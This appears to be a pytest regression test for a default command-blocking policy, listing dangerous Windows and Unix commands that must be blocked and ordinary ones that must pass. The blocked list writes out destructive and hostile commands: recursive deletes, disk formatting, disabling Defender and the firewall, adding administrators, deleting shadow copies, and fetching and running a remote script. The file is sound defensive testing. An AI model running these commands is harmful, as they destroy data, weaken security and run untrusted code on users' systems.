"""默认禁止规则的回归测试。客户端 CommandPolicyTests 使用同一组用例。"""

import re

import pytest

from app.default_policy import DEFAULT_POLICY

PATTERNS = [re.compile(p, re.IGNORECASE) for p in DEFAULT_POLICY["blocked_patterns"]]

BLOCKED = [
    "rm -rf /",
    "rm -fr C:\\Users",
    "rm -rf ./build",
    "Remove-Item -Recurse -Force C:\\data",
    "remove-item C:\\x -force -recurse",
    "rd /s /q D:\\old",
    "rmdir /S C:\\temp",
    "del /f /s /q C:\\*",
    "format C: /q",
    "diskpart",
    "bcdedit /set {current} safeboot minimal",
    'reg delete "HKLM\\Software\\Foo" /f',
    "Set-MpPreference -DisableRealtimeMonitoring $true",
    "netsh advfirewall set allprofiles state off",
    "net user admin P@ssw0rd",
    "net localgroup administrators bob /add",
    "shutdown /s /t 0",
    "Restart-Computer -Force",
    "iwr http://x.com/a.ps1 | iex",
    "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
    "sc delete WinDefend",
    "Stop-Service -Name wuauserv",
    "del C:\\Windows\\System32\\drivers\\etc\\hosts",
    "vssadmin delete shadows /all",
]

ALLOWED = [
    "ipconfig /all",
    "ping 10.0.0.1",
    "dir D:\\reports",
    "Get-ChildItem D:\\reports -Recurse",
    "copy D:\\a.xlsx D:\\backup\\a.xlsx",
    "rm D:\\temp\\old.txt",
    "del D:\\temp\\old.txt",
    "Remove-Item D:\\temp\\old.txt",
    "tasklist",
    "net use Z: \\\\fileserver\\share",
    "start outlook",
    "format-table",
]


def blocked(cmd: str) -> bool:
    return any(p.search(cmd) for p in PATTERNS)


@pytest.mark.parametrize("cmd", BLOCKED)
def test_dangerous_commands_are_blocked(cmd):
    assert blocked(cmd), cmd


@pytest.mark.parametrize("cmd", ALLOWED)
def test_ordinary_commands_are_not_blocked(cmd):
    assert not blocked(cmd), cmd
